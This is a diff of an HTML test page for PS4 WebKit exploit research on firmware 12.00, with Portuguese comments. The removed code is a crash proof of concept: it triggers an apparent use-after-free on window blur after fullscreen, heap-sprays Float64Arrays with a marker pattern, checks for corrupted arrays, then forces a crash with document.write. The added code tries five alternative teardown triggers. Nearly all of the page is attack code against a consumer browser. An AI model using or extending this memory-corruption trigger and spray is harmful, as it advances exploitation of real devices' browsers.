@@ -2,69 +2,90 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 FullScreen Crash</title>
+    <title>PS4 Research - Leandro (v12.00)</title>
 </head>
 <body>
 
-    <h1>PS4 12.00 - Crash</h1>
+    <h1>PS4 WebKit - Alternative Trigger Lab</h1>
+    <p>Target: Firmware 12.00 | Goal: Non-destructive Teardown</p>
     
-    <button onclick="runCrashTest1()">Run Crash</button>
-    <div id="result1"></div>
+    <div id="status">Status: Ready. Click a button and press OPTIONS.</div>
+    <hr>
+
+    <button onclick="runTest(1)">1. History PushState</button>
+    <p><small>Tenta disparar o crash via serialização de objetos no histórico.</small></p>
+
+    <button onclick="runTest(2)">2. DOM Re-render (Display)</button>
+    <p><small>Força o motor gráfico a reconstruir a árvore de renderização.</small></p>
+
+    <button onclick="runTest(3)">3. Target innerHTML Wipe</button>
+    <p><small>Limpa apenas um container específico em vez da página toda.</small></p>
+
+    <button onclick="runTest(4)">4. Location Hash Trigger</button>
+    <p><small>Dispara eventos de navegação interna (hashchange).</small></p>
+
+    <button onclick="runTest(5)">5. Iframe document.write</button>
+    <p><small>Executa o write apenas dentro de um frame isolado.</small></p>
+
+    <div id="container" style="border:1px solid #ccc; padding:10px; margin-top:20px;">
+        Target Container
+    </div>
 
     <script>
     const PATTERN = 2.121995791e-314; // 0x4141414141414141
+    const status = document.getElementById('status');
+    const container = document.getElementById('container');
 
-    // VARIAÇÃO 1: EXATAMENTE IGUAL AO SEU ARQUIVO
-    function runCrashTest1() {
-        const result = document.getElementById('result1');
-        result.innerHTML = '<h4>Crash PoC Running - Press OPTIONS button</h4>';
+    function runTest(type) {
+        status.innerHTML = "<b>Mode " + type + " Active! Enter Fullscreen and press OPTIONS.</b>";
         
-        let controllers = [];
-        // Step 1: Create objects (Identical to original)
-        for(let i = 0; i < 5000; i++) {
-            let arr = new Float64Array(8);
-            arr[0] = i;
-            controllers.push(arr);
-        }
-        
-        // Step 2: Fullscreen (Identical to original)
-        const elem = document.documentElement;
-        if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-        
-        // Step 3: Trigger on Options (Blur)
+        // Entrar em Fullscreen conforme sua sequência de sucesso
+        const el = document.documentElement;
+        if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+
         window.onblur = function() {
-            result.innerHTML += '<p>UAF triggered</p>';
-            
-            // Step 4: Spray (Identical: 8000 iterations)
-            let spray = [];
-            for(let i = 0; i < 8000; i++) {
-                let p = new Float64Array(10);
-                p.fill(PATTERN);
-                spray.push(p);
-            }
-            
-            // Step 5: Verification (Identical to original)
-            let corrupted = null;
-            for(let i = 0; i < controllers.length; i++) {
-                if (controllers[i][0] === PATTERN) {
-                    corrupted = controllers[i];
+            // Criando o único Float64Array que você identificou como gatilho
+            const poison = new Float64Array(10);
+            poison.fill(PATTERN);
+
+            // Seleção do Gatilho Alternativo
+            switch(type) {
+                case 1:
+                    // Altera o histórico sem recarregar a página
+                    history.pushState({data: poison}, "", "#crash" + Math.random());
                     break;
-                }
+                
+                case 2:
+                    // Força re-renderização completa do corpo
+                    document.body.style.display = "none";
+                    setTimeout(() => { document.body.style.display = "block"; }, 10);
+                    break;
+                
+                case 3:
+                    // Destruição localizada de elementos
+                    container.innerHTML = "";
+                    container.innerText = "Teardown Localizado Executado.";
+                    break;
+                
+                case 4:
+                    // Navegação interna por âncora
+                    location.hash = "trigger" + Math.random();
+                    break;
+                
+                case 5:
+                    // document.write apenas no Iframe
+                    container.innerHTML = '<iframe id="testFrame"></iframe>';
+                    const frame = document.getElementById('testFrame');
+                    const fDoc = frame.contentWindow.document;
+                    fDoc.open();
+                    fDoc.write("<html><body><h1>Iframe Crash</h1></body></html>");
+                    fDoc.close();
+                    break;
             }
             
-            if (corrupted) {
-                result.innerHTML += '<p>Corruption confirmed</p>';
-                // Step 6: The document.write sequence that causes the CE-36329-3
-                setTimeout(() => {
-                    document.open();
-                    document.write('<html><body><h1>Crash</h1></body></html>');
-                    document.close();
-                    setTimeout(() => location.reload(), 500);
-                }, 3000);
-            }
+            console.log("Gatilho " + type + " executado no blur.");
         };
     }
-
     </script>
 
 </body>
